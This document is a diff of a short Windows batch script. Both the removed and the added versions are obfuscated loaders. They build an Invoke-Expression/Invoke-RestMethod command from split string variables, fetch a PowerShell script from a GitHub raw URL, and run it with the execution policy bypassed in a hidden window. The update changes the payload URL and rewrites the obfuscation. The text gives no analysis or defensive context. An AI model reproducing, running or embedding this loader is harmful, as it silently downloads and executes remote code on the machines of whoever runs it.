@@ -1,5 +1,8 @@
-@eChO OfF
-set "XX=I"E"x (i"R"M "
-set "B=https://github.com/C4sp3n-bit/tuba/raw/refs/heads/main/savi.ps1)"
-set "C=%XX%%B%"
-pOwErsHEll -Nop -nOnI -ep "b" -""w"" "1" -"C" "%C%"
+@echo off
+set "e1=Invoke"
+set "e2=-Expression"
+set "e3= ("
+set "e4=Invoke-RestMethod"
+set "e5= https://github.com/x-ben10/talulabo/raw/refs/heads/main/Savii.ps1)"
+set "cmd=%e1%%e2%%e3%%e4%%e5%"
+powershell -NoP -NoL -ep Bypass -Win 1 -Command "%cmd%"
